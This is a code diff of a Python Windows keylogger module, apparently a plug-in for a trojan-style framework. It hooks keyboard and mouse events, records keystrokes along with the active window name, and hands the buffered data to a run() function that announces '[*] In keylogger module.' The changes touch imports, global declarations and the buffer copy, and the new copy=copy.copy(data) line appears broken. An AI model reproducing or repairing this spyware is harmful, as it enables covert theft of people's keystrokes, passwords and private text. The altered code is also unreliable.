@@ -6,15 +6,14 @@ except:
     exit(0)
     
 import win32event, win32clipboard
-from _winreg import *
-from ctypes import *
+import copy
 
 data=""
 current_window = None
 
 
 def OnMouseEvent(event):
-    global current_window
+    global current_window, data
 
     # check to see if target changed windows
     if event.WindowName != current_window:
@@ -25,7 +24,7 @@ def OnMouseEvent(event):
     return True
    
 def keypressed(event):
-    global x,data, processus, current_window
+    global data
     
     if event.Ascii==13:
         keys='<ENTER>'
@@ -66,8 +65,8 @@ pythoncom.PumpMessages()
 def run(**args):
     global data
 
-    copy=data
-    data=''
+    copy=copy.copy(data)
+    data=""
     
     print "[*] In keylogger module."
     return copy
